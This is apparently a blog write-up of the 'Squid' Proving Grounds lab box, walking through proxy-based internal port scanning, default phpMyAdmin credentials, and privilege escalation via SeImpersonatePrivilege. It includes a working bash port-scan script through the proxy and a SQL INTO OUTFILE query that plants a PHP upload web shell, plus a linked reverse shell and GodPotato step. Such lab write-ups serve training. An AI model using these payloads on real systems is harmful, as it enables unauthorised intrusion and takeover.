---
layout: post
title: "Squid - Proving Grounds Practice"
summary: "Squid Proxy 4.14 → Enumerating internal ports with squid proxy using curl (bash script) → FoxyProxy to visit website → PhpMyAdmin default credentials (root:) → PhpMyAdmin shell using SQL query (SELECT ... INTO OUTFILE) → user shell → SeImpersonatePrivilege → SYSTEM Shell"
---

# Squid - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed that target was running `Squid Proxy`.

<img width="895" height="565" alt="00 - nmap and squid proxy 4 14" src="https://github.com/user-attachments/assets/c7fd96eb-71a8-43f6-a0a8-3a8ee7ccf5b1" />

It was version `4.14`.

<img width="1126" height="531" alt="01 - web" src="https://github.com/user-attachments/assets/5ff82c5f-d919-4f2a-b8c7-ce0eac6be157" />

## Exploitation
### Squid Proxy
At first I tested squid proxy with my own web server and made sure it was working.

<img width="686" height="207" alt="02 - proxying" src="https://github.com/user-attachments/assets/fb87976e-ec83-422f-962f-77bcaa5b45b3" />

Then I created a bash script to enumerate internal ports of the target.
```bash
#!/bin/bash

# Proxy details
proxy_address="192.168.157.189"
proxy_port="3128"

# Target IP and ports
target_ip="127.0.0.1"
ports=("80" "443" "8000" "8080") 

for port in "${ports[@]}"; do
    response=$(curl -x $proxy_address:$proxy_port $target_ip:$port -I | grep -i HTTP/1.1 | cut -d ' ' -f 2)

    if [ "$response" -eq 200 ]; then
        echo "Response from $target_ip:$port with status code $response"
    fi
done
```

And this revealed that port 8080 was up.

<img width="815" height="259" alt="03 - internal enumeration" src="https://github.com/user-attachments/assets/fb087cc2-5b21-4946-ba9f-0a61a6cd3878" />

I then set the foxyproxy up and started enumerating target port.

<img width="1227" height="537" alt="04 - foxyproxy squid" src="https://github.com/user-attachments/assets/c59fea9f-8546-46eb-a23c-4731774fe341" />

<img width="1920" height="860" alt="05 - accessed" src="https://github.com/user-attachments/assets/183e6864-6e7a-4173-ab3e-2cc0c066139b" />

### PhpMyAdmin
There was a `phpmyadmin` application running. I tried default credentials `root:` and it worked.

<img width="1920" height="666" alt="06 - phpmyadmin" src="https://github.com/user-attachments/assets/0dcba32b-9e71-40a8-8aa1-3a9038e00e8d" />

Then I used SQL query tab to write a file. I found [this](https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f) which creates an uploader.php file.
```SQL
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

<img width="885" height="296" alt="image" src="https://github.com/user-attachments/assets/e76ba1db-03b0-425b-affa-8b02ffb732fb" />

Then simply uploaded reverse shell from [ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell) and obtained local service shell.

<img width="1733" height="735" alt="08 - uploaded and obtained reverse shell" src="https://github.com/user-attachments/assets/62a059aa-d9d4-42e4-a245-d9d85bf3e1d4" />

Then I read the local flag.

<img width="548" height="362" alt="09 - local flag" src="https://github.com/user-attachments/assets/7ad37f47-0bcf-46ff-8bd2-6b9c37c3f6b8" />

## Privilege Escalation
### SeImpersonatePrivilege
I found out that current account had SeImpersonatePrivilege on the target.

<img width="821" height="428" alt="10 - seimpersonateprivilege" src="https://github.com/user-attachments/assets/06e09533-a62f-4827-bed8-96839936c1c6" />

I simply used [GodPatato](https://github.com/BeichenDream/GodPotato) with [nc64.exe](https://github.com/int0x33/nc.exe/) to obtain SYSTEM shell.

<img width="955" height="460" alt="11 - godpatato" src="https://github.com/user-attachments/assets/dbfec224-d64d-4ad7-8d5f-57d31f46ffa4" />

<img width="861" height="601" alt="12 - gg" src="https://github.com/user-attachments/assets/d6789531-9676-48f1-b1aa-36933b8de451" />





